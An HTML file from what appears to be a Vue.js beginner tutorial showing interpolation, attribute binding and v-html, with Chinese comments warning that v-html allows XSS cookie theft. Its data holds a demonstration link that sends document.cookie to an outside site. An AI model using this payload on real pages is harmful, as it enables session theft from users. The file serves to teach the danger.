<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <!-- v-text,向其所在的标签插入文本，不好用，会替换掉原本的内容 -->
    <!-- v-html 支持标签，暗藏安全问题，存在js注入 XSS攻击(获取cookie)-->
    <!-- 准备好一个容器 -->
    <div id ="root">
        <h1>插值语法</h1>
        <h3>你好，{{name}}</h3>
        <hr>
        <h1>指令语法</h1>
        <a :href="url" >点我去尚硅谷</a>
        <a href=""></a>
        <h1 v-html="str"></h1>
    </div>
</body>



    <script src="../js/vue.js"></script>
    <script>
        Vue.config.productionTip = false;
        new Vue({
            el:'#root',
            data:{
                name:'jack',
                url:"http://www.atguigu.com",
                str:"<a href=javascript:location.href='http://www.baidu.com?'+document.cookie>神奇的网站</a>"
            }
        })
    </script>
</html>
